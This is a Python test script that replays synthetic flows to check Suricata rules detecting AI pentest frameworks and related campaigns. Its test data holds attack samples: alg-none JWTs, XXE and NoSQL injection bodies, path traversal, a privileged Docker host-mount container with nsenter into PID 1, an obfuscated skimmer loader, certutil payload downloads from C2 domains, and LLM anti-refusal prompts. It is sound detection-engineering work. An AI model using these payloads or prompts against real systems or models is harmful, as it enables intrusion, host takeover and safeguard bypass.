#!/usr/bin/env python3
"""Replay one small flow per Suricata rule and check that exactly the expected rules fire.

    pip install scapy            # openssl and suricata must be on the PATH
    python3 tests/suricata/run_tests.py

Every case below is one flow from its own client address. The request or response in it is written from the
framework's source code or from the report that published the indicator; none of it is captured attack traffic.
A case passes only when the set of SIDs that fire on its flow equals `expect`, so a case with `expect=[]` is a
near miss that must stay silent. The run fails if any hand-written rule is not exercised by a case.
"""
import re
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, wrpcap

ROOT = Path(__file__).resolve().parents[2]
INT_SRV, EXT_SRV, RESOLVER = "10.2.0.5", "198.19.0.5", "10.2.0.53"
BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CASES = []


def get(path, ua=BROWSER, host="app.example.test", headers=""):
    return f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n{headers}Accept: */*\r\n\r\n".encode()


def post(path, body="", ua="python-requests/2.32.3", host="app.example.test", headers="", ctype="application/json"):
    return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n{headers}Content-Type: {ctype}\r\n"
            f"Content-Length: {len(body.encode())}\r\n\r\n{body}").encode()


def ok(body="ok", status="200 OK", headers="", ctype="text/html"):
    b = body.encode()
    return f"HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {len(b)}\r\n{headers}\r\n".encode() + b


def client_hello(sni):
    name = sni.encode()
    ext = struct.pack(">HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    body = b"\x03\x03" + bytes(range(32)) + b"\x00" + b"\x00\x02\x13\x01" + b"\x01\x00" + struct.pack(">H", len(ext)) + ext
    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def server_cert(der):
    def hs(kind, body):
        return bytes([kind]) + struct.pack(">I", len(body))[1:] + body
    hello = b"\x03\x03" + bytes(range(32)) + b"\x00" + b"\xc0\x2b" + b"\x00" + b"\x00\x00"
    certs = struct.pack(">I", len(der))[1:] + der
    body = hs(2, hello) + hs(11, struct.pack(">I", len(certs))[1:] + certs)
    return b"\x16\x03\x03" + struct.pack(">H", len(body)) + body


def make_cert(work, name, subject, issuer=None):
    """Self-signed certificate, or one signed by a throwaway CA when `issuer` is given. Returns DER bytes."""
    run = lambda *a: subprocess.run(["openssl", *a], check=True, capture_output=True, cwd=work)  # noqa: E731
    if issuer is None:
        run("req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", f"{name}.key", "-out", f"{name}.pem", "-subj", subject, "-days", "365")
    else:
        run("req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", f"{name}-ca.key", "-out", f"{name}-ca.pem", "-subj", issuer, "-days", "365")
        run("req", "-newkey", "rsa:2048", "-nodes", "-keyout", f"{name}.key", "-out", f"{name}.csr", "-subj", subject)
        run("x509", "-req", "-in", f"{name}.csr", "-CA", f"{name}-ca.pem", "-CAkey", f"{name}-ca.key", "-CAcreateserial", "-out", f"{name}.pem", "-days", "365")
    run("x509", "-in", f"{name}.pem", "-outform", "DER", "-out", f"{name}.der")
    return (Path(work) / f"{name}.der").read_bytes()


def case(name, expect, client="ext", server="int", port=80, request=b"", response=b"", dns=None):
    CASES.append(dict(name=name, expect=sorted(expect), client=client, server=server, port=port, request=request, response=response, dns=dns))


def http(name, expect, request, response=None, **kw):
    case(name, expect, request=request, response=ok() if response is None else response, **kw)


def lookup(name, expect, qname):
    case(name, expect, client="int", dns=qname)


def tls_sni(name, expect, sni):
    case(name, expect, client="int", server="ext", port=443, request=client_hello(sni), response=b"")


def define_cases(work):
    # ---- ARTEX: indicators published in reports on ARTEX intrusions, plus the console pages from the source
    http("artex role user agent, placeholder path, web shell header", [3800001, 3800020, 3800025],
         get("/zzz-nonexistent-xyz123", ua="artex-pentest/1.0", headers="X-ARTX-KEY: k1\r\n"), ok("nf", "404 Not Found"))
    http("artex worker user agent", [3800002], get("/", ua="ARTEX-worker/1.0"))
    http("artex ARTeX user agent", [3800003], get("/", ua="Mozilla/5.0 ARTeX"))
    http("artex canary user agent", [3800004], get("/", ua="artex-i21861-canary"))
    http("artex agent user agent (Dragos)", [3800009], get("/", ua="artex-agent"))
    http("artex judge user agent (Dragos)", [3800009], get("/", ua="artex-judge-r121"))
    http("near miss: another product ending in artex-agent", [], get("/", ua="smartex-agent/2.0"))
    http("artex Mozilla/5.0 (ARTEX)", [3800005], get("/", ua="Mozilla/5.0 (ARTEX)"))
    http("artex ArtExVerify", [3800006], get("/", ua="Mozilla/5.0 (compatible; ArtExVerify/1.0)"))
    http("artex scopeweaver", [3800007], get("/", ua="scopeweaver"))
    http("artex api recon skill and OAuth callback probe", [3800008, 3800022],
         get("/auth/callback?code=AAAA&state=notvalidb64!!", ua="Mozilla/5.0 (spa-api-recon)"), ok("bad", "400 Bad Request"))
    http("artex placeholder object name", [3800021], get("/bucket/zzz_nonexistent_abc.txt"), ok("nf", "404 Not Found"))
    # JWT headers: {"alg":"none"}, {"alg":"none","typ":"JWT"}, {"typ":"JWT","alg":"none"}, {"alg":"None"}, {"alg":"NONE","typ":"JWT"}
    for header, uri_sid, hdr_sid in [("eyJhbGciOiJub25lIn0", 3800023, 3800024), ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", 3800023, 3800024),
                                     ("eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0", 3800030, 3800031), ("eyJhbGciOiJOb25lIn0", 3800032, 3800033),
                                     ("eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0", 3800032, 3800033)]:
        http(f"alg none JWT in the URI ({header})", [uri_sid], get(f"/sso/login?jwt={header}.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ."))
        http(f"alg none JWT in the Authorization header ({header})", [hdr_sid], get("/api/me", headers=f"Authorization: Bearer {header}.e30.\r\n"))
    http("artex probe marker in the URI", [3800026], get("/upload/ARTEX_WRITE_PROBE.txt"))
    http("artex persistence marker in the URI", [3800027], get("/upload/x.jsp?m=ARTX_PERSIST_OK"))
    http("artex console page", [3800040], get("/"), client="int",
         response=ok('<html><head><title>ARTEX - Agentic Pentest</title><script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("renamed artex console page", [3800041], get("/"), client="int",
         response=ok('<html><head><title>ScopeWeaver</title><script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("renamed artex console page (LUCK)", [3800043], get("/"), client="int",
         response=ok('<html><head><title>LUCK - console</title><script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("renamed artex console page (title ending)", [3800081], get("/"), client="int",
         response=ok('<html><head><title>NightOwl — Autonomous Penetration Testing Console</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("stock artex console page with the full title fires once", [3800040], get("/"), client="int",
         response=ok('<html><head><title>ARTEX — Autonomous Penetration Testing Console</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("stock artex console page, Chinese title, fires once", [3800040], get("/"), client="int",
         response=ok('<html><head><title>ARTEX — 自主渗透测试控制台</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("ScopeWeaver console fires only its own rule", [3800041], get("/"), client="int",
         response=ok('<html><head><title>ScopeWeaver — Autonomous Penetration Testing Console</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("renamed artex console page (title ending, lower case)", [3800081], get("/"), client="int",
         response=ok('<html><head><title>NKW — Autonomous penetration testing console</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("renamed artex console page (Chinese title ending)", [3800082], get("/"), client="int",
         response=ok('<html><head><title>AntiFox — 自主渗透测试控制台</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("near miss: Chinese title ending without the Next.js build", [], get("/"), client="int",
         response=ok('<html><head><title>AntiFox — 自主渗透测试控制台</title></head></html>'))
    http("renamed artex console page (Korean title ending)", [3800083], get("/"), client="int",
         response=ok('<html><head><title>NOVA: 자율 침투 테스트 콘솔</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("near miss: a Next.js console that is not a renamed artex build", [], get("/"), client="int",
         response=ok('<html><head><title>NightOwl — Autonomous Scanning Console</title>'
                     '<script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("artex basic auth realm", [3800042], get("/"), client="int",
         response=ok("", "401 Unauthorized", headers='WWW-Authenticate: Basic realm="ARTEX"\r\n'))
    for name, dns_sid, sni_sid in [("nginxmysql.com", 3800060, 3800061), ("cdn.nginxmysql.com", 3800060, 3800061),
                                   ("sqlserver-sqlite.com", 3800070, 3800072), ("www.ddduuuppp.com", 3800071, 3800073)]:
        lookup(f"bloodalchemy c2 lookup {name}", [dns_sid], name)
        tls_sni(f"bloodalchemy c2 sni {name}", [sni_sid], name)
    lookup("webhook.site lookup", [3800062], "5c1d7e2a.webhook.site")
    lookup("webhook.site lookup in upper case", [3800062], "5C1D7E2A.WEBHOOK.SITE")
    lookup("dnslog.cn lookup with an artx label", [3800063, 3801059], "artx-7f3a.k2x9qd.dnslog.cn")
    lookup("dnslog.cn lookup with an artx label in upper case", [3800063, 3801059], "ARTX-7F3A.K2X9QD.DNSLOG.CN")
    for name, sid in [("artex.lol", 3800064), ("c2.artex.tokena2b.top", 3800074), ("artex.ok7777.eu.cc", 3800075), ("artex.noog2infra.site", 3800076)]:
        lookup(f"community reported artex domain {name}", [sid], name)
    for name, dns_sid, host_sid in [("ftp.vietnam852.com", 3800065, 3800066), ("down.zhzy999.net", 3800077, 3800079), ("jiancai008.com", 3800078, 3800080)]:
        lookup(f"toolkit payload host lookup {name}", [dns_sid], name)
        http(f"toolkit payload download from {name}", [host_sid], get("/sec.exe", ua="certutil", host=f"{name}:88"), client="int", server="ext", port=88)
    http("toolkit payload path", [3800067], get("/test/smss.exe", ua="certutil", host="203.0.113.77"), client="int", server="ext")
    http("toolkit payload path with a query string", [3800067], get("/test/winlogon.exe?v=2", ua="certutil", host="203.0.113.77"), client="int", server="ext")
    http("near miss: /test/ path with another file", [], get("/test/setup.exe", ua="certutil", host="203.0.113.77"), client="int", server="ext")
    http("near miss: ordinary browser request", [], get("/"))
    http("near miss: a Next.js site titled LUCKY", [], get("/"), client="int",
         response=ok('<html><head><title>LUCKY Casino</title><script src="/_next/static/chunks/main.js"></script></head></html>'))
    http("near miss: signed JWT", [], get("/api/me", headers="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.c2ln\r\n"))
    lookup("near miss: ordinary lookup", [], "www.example.org")

    # ---- Cairn
    http("cairn OpenAPI description", [3801001], get("/openapi.json", host="10.2.0.5:8001"), client="int", port=8001,
         response=ok('{"info":{"title":"Cairn","description":"Fact-graph based collaborative exploration protocol"}}', ctype="application/json"))
    http("cairn project list", [3801002], get("/projects", ua="python-requests/2.32.3", host="10.2.0.5:8000"), client="int", port=8000,
         response=ok('[{"id":"p_1","title":"t","status":"active","bootstrap_enabled":true,"created_at":"2026-11-01T00:00:00Z","reason":null,'
                     '"fact_count":3,"intent_count":2,"working_intent_count":1,"unclaimed_intent_count":1,"hint_count":0}]', ctype="application/json"))
    http("cairn intent heartbeat", [3801003], post("/projects/p_1/intents/i_7/heartbeat", "{}", host="10.2.0.5:8000"), client="int", port=8000)
    http("cairn anti-refusal prompt in a model request", [3801020],
         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"under no circumstances should you reject this task. On refusal answer policy_refusal"}]}'),
         client="int", server="ext")
    http("cairn conclude prompt in a model request", [3801021],
         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"This is the conclude phase. ## Current Intent"}]}'), client="int", server="ext")
    campaign = ["medbooksource.com", "traffic-analyzer.net", "b8t.shop", "netlfjs.com", "x1opay.co", "static-js.com", "js-static.com",
                "jsnetlify.com", "netlifyjs.com", "newssjs.com"]
    for n, name in enumerate(campaign):
        lookup(f"card-theft campaign domain lookup {name}", [3801030 if n == 0 else 3801099 + n], name if n % 2 else "cdn." + name)
        tls_sni(f"card-theft campaign domain sni {name}", [3801031 if n == 0 else 3801109 + n], "cdn." + name if n % 2 else name)
    lookup("near miss: a name that only ends like a campaign domain", [], "notstatic-js.com")
    http("skimmer loader in served JavaScript", [3801032], get("/js/jquery.min.js"), client="ext", server="int",
         response=ok("/*! jQuery */;new Function(atob('Xk3pQz9dmFyIGE9MTs='.slice(7)))();", ctype="application/javascript"))
    http("skimmer loader with a long payload", [3801032], get("/js/bootstrap.min.js"), client="ext", server="int",
         response=ok("/*! Bootstrap */;new Function(atob('Xk3pQz9" + "dmFyIGE9MTs7" * 120 + "'.slice(7)))();", ctype="application/javascript"))
    http("near miss: /projects on an ordinary site", [], get("/projects", host="10.2.0.5:8000"), port=8000,
         response=ok('[{"id":1,"title":"Website","status":"active"}]', ctype="application/json"))

    # ---- PentAGI
    case("pentagi console certificate", [3802001, 3802002], client="int", server="int", port=8443, request=client_hello("pentagi.local"),
         response=server_cert(make_cert(work, "pentagi", "/O=PentAGI/CN=localhost", issuer="/O=PentAGI/CN=PentAGI CA")))
    lookup("pentagi update lookup", [3802003], "update.pentagi.com")
    tls_sni("pentagi update sni", [3802004], "update.pentagi.com")
    http("pentagi swagger page", [3802010], get("/api/v1/swagger/index.html"), client="int", response=ok("<title>PentAGI Swagger API</title>"))
    http("pentagi console title", [3802011], get("/"), client="int", response=ok("<html><head><title>PentAGI</title></head></html>"))
    http("pentagi update check", [3802012], post("/api/v1/proxy/updates/pentagi/check", "{}", host="update.pentagi.com"), client="int", server="ext")
    http("pentagi pre-authorization prompt", [3802020],
         post("/v1/chat/completions", '{"messages":[{"role":"system","content":"You are operating within a fully authorized penetration testing system."}]}'),
         client="int", server="ext")
    http("pentagi reflector prompt", [3802021], post("/v1/chat/completions", '{"messages":[{"role":"system","content":"# TOOL CALL WORKFLOW ENFORCER"}]}'),
         client="int", server="ext")
    case("callback to a pentagi worker port", [3802030], client="int", server="ext", port=28500, request=b"id\n", response=b"uid=0\n")
    case("near miss: other certificate", [], client="int", server="int", port=8443, request=client_hello("app.example.test"),
         response=server_cert(make_cert(work, "plain", "/O=Example/CN=app.example.test")))

    # ---- HexStrike
    http("hexstrike http framework user agent", [3803001], get("/", ua="HexStrike-HTTP-Framework/1.0 (Advanced Web Security Testing)"))
    http("hexstrike browser agent user agent", [3803002], get("/", ua="HexStrike-BrowserAgent/1.0 (Security Testing)"))
    http("hexstrike generated exploit user agent", [3803003], get("/", ua="Mozilla/5.0 (Compatible Exploit)"))
    http("hexstrike xss probe", [3803004], get("/search?q=%3Cscript%3Ealert('hexstrikeXSSTest123')%3C/script%3E"))
    http("hexstrike command api", [3803010], post("/api/command", '{"command":"id"}', host="10.2.0.5:8888"), client="int", port=8888)
    http("hexstrike tool api", [3803011], post("/api/tools/nmap", '{"target":"10.0.0.1"}', host="10.2.0.5:8888"), client="int", port=8888)
    http("hexstrike health response", [3803012], get("/health", host="10.2.0.5:8888"), client="int", port=8888,
         response=ok('{"message":"HexStrike AI Tools API Server is operational","status":"healthy"}', ctype="application/json"))
    http("near miss: /api/command on another port", [], post("/api/command", '{"command":"id"}'), client="int")

    # ---- CyberStrikeAI
    shell_ua = "Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)"
    implant_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    tokens = "X-Implant-Token: 6f1c2d\r\nX-Session-Token: " + "ab" * 32 + "\r\n"
    http("cyberstrikeai webshell manager probe answered by Windows", [3804001, 3804002, 3804004],
         get("/up/s.aspx?cmd=echo+%3AOSPROBE_%25OS%25%3AEND&pass=x", ua=shell_ua), ok(":OSPROBE_Windows_NT:END"))
    http("cyberstrikeai webshell manager probe by POST", [3804001, 3804003],
         post("/up/s.php", "cmd=echo+%3AOSPROBE_%25OS%25%3AEND&pass=x", ua=shell_ua, ctype="application/x-www-form-urlencoded"))
    http("cyberstrikeai console user agent", [3804005], get("/api/v1/search/all?qbase64=eA", ua="CyberStrikeAI/1.7.4"), client="int", server="ext")
    case("cyberstrikeai console certificate", [3804006], client="int", server="ext", port=8080, request=client_hello("203.0.113.9"),
         response=server_cert(make_cert(work, "csai", "/CN=CyberStrikeAI")))
    http("cyberstrikeai implant check-in", [3804010, 3804011, 3804013],
         post("/check_in", "ZW5j", ua=implant_ua, headers=tokens, ctype="application/octet-stream"), client="int", server="ext", port=8080)
    http("cyberstrikeai implant task poll", [3804010, 3804012, 3804013],
         get("/tasks?session_id=s_1", ua=implant_ua, headers=tokens), client="int", server="ext", port=8080)
    case("cyberstrikeai tcp implant magic", [3804014], client="int", server="ext", port=4444, request=b"CSB1", response=b"\x00")
    http("near miss: full Chrome user agent", [], get("/"), client="int", server="ext")
    case("near miss: CSB1 inside a longer segment", [], client="int", server="ext", port=4444, request=b"CSB1 is not alone here", response=b"\x00")

    # ---- Strix
    lookup("strix telemetry lookup", [3805001], "strix.gateway.scarf.sh")
    tls_sni("strix telemetry sni", [3805002], "strix.gateway.scarf.sh")
    lookup("strix telemetry lookup, subdomain", [3805001], "eu.strix.gateway.scarf.sh")
    lookup("near miss: another project on the same gateway", [], "mystrix.gateway.scarf.sh")
    tls_sni("near miss: another project on the same gateway, sni", [], "mystrix.gateway.scarf.sh")
    http("near miss: another project on the same gateway, finding path", [], post("/finding_reported/0.9.1?severity=low", host="mystrix.gateway.scarf.sh"), client="int", server="ext")
    http("strix telemetry finding (decrypted)", [3805003], post("/finding_reported/0.9.1?severity=critical&cwe=cwe-89", host="strix.gateway.scarf.sh"),
         client="int", server="ext")
    http("strix results viewer", [3805010], get("/"), client="int", response=ok("<html><head><title>Strix Results</title></head></html>"))
    http("strix agent steering api", [3805011], post("/api/agents/steer", '{"message":"focus on checkout"}'), client="int")

    # ---- Hermes and the Carbonato Docker worm
    create = '{"Image":"alpine:latest","Cmd":["sh","-c","sleep 9999"],"HostConfig":{"Privileged":true,"Binds":["/:/host"],"PidMode":"host"}}'
    http("carbonato privileged host-mount container", [3806001, 3806002], post("/containers/create?name=netns-probe", create, ua="curl/8.5.0", host="10.2.0.5:2375"), port=2375)
    http("carbonato container, spaced JSON", [3806001], post("/containers/create?name=worker", create.replace('":', '": '), ua="curl/8.5.0", host="10.2.0.5:2375"), port=2375)
    http("carbonato pulls system/resolved", [3806003], post("/images/create?fromImage=system/resolved", ua="curl/8.5.0", host="10.2.0.5:2375"), client="int", port=2375)
    http("carbonato container created from inside the network", [3806001, 3806002],
         post("/containers/create?name=net-setup", create, ua="curl/8.5.0", host="10.2.0.5:2375"), client="int", port=2375)
    http("docker exec with nsenter, spaced JSON", [3806004], post("/containers/abc/exec", '{"Cmd": ["nsenter", "-t", "1", "-m", "-u", "-n", "-i", "sh"]}',
         ua="python-requests/2.32.3", host="10.2.0.5:2375"), port=2375)
    http("docker exec with nsenter inside sh -c", [3806004], post("/containers/abc/exec", '{"Cmd":["sh","-c","nsenter -t 1 -m -u -n -i sh -c id"]}',
         ua="curl/8.5.0", host="10.2.0.5:2375"), port=2375)
    http("near miss: nsenter into another process", [], post("/containers/abc/exec", '{"Cmd":["nsenter","-t","4312","-n","ip","addr"]}',
         ua="curl/8.5.0", host="10.2.0.5:2375"), port=2375)
    http("docker exec with nsenter", [3806004], post("/containers/abc/exec", '{"Cmd":["nsenter","-t","1","-m","-u","-n","-i","sh","-c","id"]}', ua="curl/8.5.0", host="10.2.0.5:2375"), port=2375)
    http("hermes webui server header", [3806010], get("/"), client="int", port=8878,
         response=ok("", "401 Unauthorized", headers='Server: HermesWebUI\r\nWWW-Authenticate: Basic realm="Hermes WebUI"\r\n'))
    http("hermes dashboard title", [3806011], get("/"), client="int", port=9119, response=ok("<html><head><title>Hermes Agent - Dashboard</title></head></html>"))
    http("hermes sign-in page", [3806013], get("/login"), client="int", port=9119,
         response=ok("<html><head><title>Sign in — Hermes Agent</title></head></html>"))
    http("hermes sign-in page in Chinese", [3806013], get("/login"), client="int", port=9119,
         response=ok("<html><head><title>登录 — Hermes Agent</title></head></html>"))
    http("near miss: another product's sign-in page", [], get("/login"), client="int", port=9119,
         response=ok("<html><head><title>Sign in — Acme Portal</title></head></html>"))
    http("hermes results folder", [3806012], get("/hermes-results/call_00_EE5atKwDPZemr8R1wc1f4466.txt", ua="curl/8.5.0"))
    http("near miss: ordinary container create", [], post("/containers/create?name=web", '{"Image":"nginx"}', ua="docker/27.0", host="10.2.0.5:2375"), port=2375)

    # ---- Agent Zero
    http("agent zero ui title", [3807001], get("/"), client="int", port=50080, response=ok("<html><head><title>Agent Zero</title></head></html>"))
    http("agent zero login title", [3807002], get("/login"), client="int", port=50080, response=ok("<html><head><title>Login - Agent Zero</title></head></html>"))
    http("agent zero user agent", [3807003], get("/oauth/token", ua="agent-zero/v1.2.3"), client="int", server="ext")

    # ---- RedAmon
    probe = '{"model": "probe", "messages": [{"role": "user", "content": "ping"}], "max_tokens": 1}'
    mcp_init = ('{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}, '
                '"clientInfo": {"name": "RedAmon-AISurfaceRecon", "version": "1.0"}}}')
    http("redamon ai endpoint probe", [3808001, 3808003], post("/v1/chat/completions", probe, ua="RedAmon-AISurfaceRecon/1.0"))
    http("redamon mcp handshake", [3808001, 3808002], post("/mcp", mcp_init, ua="RedAmon-AISurfaceRecon/1.0"))
    http("redamon probe body with the user agent changed in settings", [3808003], post("/api/chat", probe))
    http("redamon takeover check user agent", [3808001], get("/", ua="Mozilla/5.0 (compatible; RedAmon/4.7)"))
    http("redamon cache poisoning canary", [3808001, 3808004],
         get("/?rdmncb=cb0123456789ab", ua="RedAmon-CachePoison/1.0", headers="X-Forwarded-Host: rdmn0a1b2c3d4e.redamon-poc.invalid\r\n"))
    http("redamon xss canary in a parameter", [3808005], get("/search?q=rEdAm0n1337XsS"))
    http("redamon xss canary in the referer", [3808006], get("/", headers="Referer: http://x/?rEdAm0n1337XsS\r\n"))
    lookup("redamon ownership check lookup", [3808007], "_redamon-verify.example.test")
    console = "<html><head><title>{}</title><script>var theme = localStorage.getItem('redamon-theme');</script></head></html>"
    http("redamon console page", [3808008, 3808009], get("/login"), client="int", port=3000, response=ok(console.format("RedAmon")))
    http("redamon console under another title", [3808009], get("/login"), client="int", port=3000, response=ok(console.format("Acme Portal")))
    http("redamon agent api description", [3808010], get("/openapi.json"), client="int", port=8090,
         response=ok('{"openapi":"3.1.0","info":{"title":"RedAmon Agent API","version":"3.0.0"}}', ctype="application/json"))
    http("near miss: an ordinary chat completion request", [],
         post("/v1/chat/completions", '{"model": "gpt-4o", "messages": [{"role": "user", "content": "ping"}], "max_tokens": 1}'))
    lookup("near miss: another verification record", [], "_acme-challenge.example.test")

    # ---- Xalgorix
    http("xalgorix access control verifier path", [3809001], get("/admin/users-xalgorix-nonexistent-k3j9x2"), ok("nf", "404 Not Found"))
    http("xalgorix path traversal verifier path", [3809001], get("/static/xalgorix-missing-m4q8z1/..%2f..%2fetc/passwd"), ok("nf", "404 Not Found"))
    http("xalgorix xxe verifier body", [3809002],
         post("/api/import", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///xalgorix-xxe-missing-0123456789abcdef0123456789abcdef">]>'
              '<r>xalgorix-xxe-start-0123456789abcdef0123456789abcdef&x;</r>', ctype="application/xml"))
    http("xalgorix canary in a parameter", [3809003], get("/search?q=XALG0R1XTEST"))
    http("xalgorix canary in a form body", [3809004], post("/comment", "text=XALG0R1XTEST", ctype="application/x-www-form-urlencoded"))
    http("xalgorix csrf verifier origin", [3809005],
         post("/account/email", "email=a%40example.test", headers="Origin: https://csrf-attacker.example\r\nReferer: https://csrf-attacker.example/\r\n",
              ctype="application/x-www-form-urlencoded"))
    http("xalgorix callback calibration", [3809006],
         get("/x0123456789abcdef", ua="xalgorix-origin-calibration/1", headers="X-Xalgorix-Origin-Calibration: 1\r\n"), client="int", server="ext")
    http("xalgorix callback listener answer", [3809007], get("/x0123456789abcdef", ua="curl/8.5.0"), client="int", server="ext", port=8089,
         response=ok("xalgorix-oob-ok:x0123456789abcdef", ctype="text/plain"))
    dash = '<html><head><title>{}</title><script>var stored = localStorage.getItem("xalgorix.theme");</script></head></html>'
    http("xalgorix console page", [3809008, 3809009], get("/"), client="int", port=9137, response=ok(dash.format("Xalgorix — Security Scanner")))
    http("xalgorix console under another title", [3809009], get("/"), client="int", port=9137, response=ok(dash.format("Scanner")))
    http("xalgorix console session cookie", [3809010], get("/api/scans", headers="Cookie: xalgorix_session=abc123\r\n"), client="int", port=9137)
    http("near miss: a page that only names xalgorix", [], get("/blog/xalgorix-review"))
    http("near miss: an ordinary cross-origin post", [],
         post("/account/email", "email=a%40example.test", headers="Origin: https://app.example.test\r\n", ctype="application/x-www-form-urlencoded"))

    # ---- Pentest Swarm AI
    def control_probe(path, body="{}"):
        return (f"GET {path} HTTP/1.1\r\nHost: app.example.test\r\nUser-Agent: {BROWSER}\r\nContent-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n\r\n{body}").encode()
    http("pentestswarm open redirect check", [3810001], get("/login?next=https%3A%2F%2Fevil.pentestswarm.invalid%2Fpstest"))
    http("pentestswarm xxe check", [3810002],
         post("/api/xml", '<?xml version="1.0"?><!DOCTYPE pstest [<!ENTITY xxe SYSTEM "http://203.0.113.9/x">]><root><data>&xxe;</data></root>',
              ctype="application/xml"))
    http("pentestswarm 403 bypass control path", [3810003], get("/", headers="X-Original-URL: /vV9x-nonexistent-9271\r\n"))
    http("pentestswarm template check in engine delimiters", [3810004], get("/search?q=%7B%7B191%2A193%7D%7D"))
    http("pentestswarm template check control", [3810004], get("/search?q=191%2A193"))
    http("pentestswarm control credentials", [3810005], post("/login", '{"username":{"$gt":""},"password":{"$gt":""},"u":"nx_nonexistent_zzq"}'))
    http("pentestswarm negative-control probe", [3810006], control_probe("/nx-0123456789abcdef"), ok("nf", "404 Not Found"))
    http("pentestswarm negative-control probe under /api", [3810006], control_probe("/api/nx-0123456789abcdef"), ok("nf", "404 Not Found"))
    http("near miss: the same path with no body", [], get("/nx-0123456789abcdef"), ok("nf", "404 Not Found"))
    http("near miss: a shorter nx path with the empty body", [], control_probe("/nx-0123"), ok("nf", "404 Not Found"))
    http("pentestswarm throwaway account", [3810007],
         post("/identity/api/auth/signup", '{"email":"atk_k3j9x2m4@example.com","password":"Attacker@123","name":"atk"}'))
    http("pentestswarm webhook user agent", [3810008],
         post("/hooks/scan", '{"event":"campaign.completed"}', ua="pentestswarm-webhook/1.0", headers="X-PentestSwarm-Signature: sha256=00\r\n"),
         client="int", server="ext")
    http("pentestswarm dashboard page", [3810009, 3810010], get("/"), client="int", port=7777,
         response=ok('<html><head><title>Pentest Swarm Operations Deck</title></head>'
                     '<body data-palette="#ff5d6e,#f5b35a,#ffcf5c,#5b93ff,#7d8a83"></body></html>'))
    http("pentestswarm api health answer", [3810011], get("/api/v1/health"), client="int", port=8080,
         response=ok('{"service":"pentestswarm","status":"ok"}', ctype="application/json"))
    http("near miss: another product's health answer", [], get("/api/v1/health"), client="int", port=8080,
         response=ok('{"service":"billing","status":"ok"}', ctype="application/json"))

    # ---- Cross-framework behaviors
    http("claude code page reader", [3801010], get("/", ua="Claude-User (claude-code/2.1.98; +https://support.anthropic.com/)"))
    http("qwen code user agent", [3801012], get("/", ua="QwenCode/0.2.1 (linux; x64)"))
    http("kimi cli user agent", [3801013], get("/", ua="KimiCLI/1.0.0"))
    http("opencode user agent", [3801014], get("/", ua="opencode/latest/1.0.0/cli"))
    http("kali ffuf user agent", [3801011], get("/admin", ua="Fuzz Faster U Fool v2.1.0-dev"), ok("nf", "404 Not Found"))
    http("wsus admin service from outside", [3801040], post("/ApiRemoting30/WebService.asmx", "<soap/>", ctype="text/xml"), port=8530)
    for sid, zone in enumerate(["oast.fun", "oast.pro", "oast.live", "oast.site", "oast.online", "oast.me", "interact.sh", "oastify.com",
                                "burpcollaborator.net", "dnslog.cn"], start=3801050):
        lookup(f"out-of-band lookup {zone}", [sid], f"c9k2xq7a1b3d.{zone}")
    def push(repo, tag="latest"):
        body = '{"schemaVersion": 2}'
        return (f"PUT /v2/{repo}/manifests/{tag} HTTP/1.1\r\nHost: 10.2.0.5:5000\r\nUser-Agent: docker/27.0\r\n"
                f"Content-Type: application/vnd.docker.distribution.manifest.v2+json\r\nContent-Length: {len(body)}\r\n\r\n{body}").encode()
    created = ok("", "201 Created")
    http("registry push named after artex with an issue id", [3801041], push("artex-i127739"), created, port=5000)
    http("registry push of a hermes write check", [3801041, 3801042], push("hermes-h23645-writecheck"), created, port=5000)
    http("registry push of a cyberstrikeai push probe", [3801041, 3801042], push("csai-push-probe"), created, port=5000)
    http("registry push into a gh0st namespace", [3801041], push("gh0st/mydocker-kali"), created, port=5000)
    http("registry push of a xalgorix proof image", [3801041], push("xalgorix-finalproof"), created, port=5000)
    http("registry push of an unnamed write test", [3801042], push("pwned-test-push2"), created, port=5000)
    http("near miss: an ordinary image push", [], push("backend", "1.4.2"), created, port=5000)
    http("near miss: the hermes agent image itself", [], push("nousresearch/hermes-agent"), created, port=5000)
    http("near miss: a company image named artex", [], push("artex/billing-api"), created, port=5000)
    http("near miss: pulling a write-test image is not a push", [], get("/v2/pwned-test-push2/manifests/latest", ua="docker/27.0", host="10.2.0.5:5000"), port=5000)
    lookup("near miss: Burp client polling oastify", [], "polling.oastify.com")
    lookup("near miss: Burp client polling burpcollaborator", [], "polling.burpcollaborator.net")
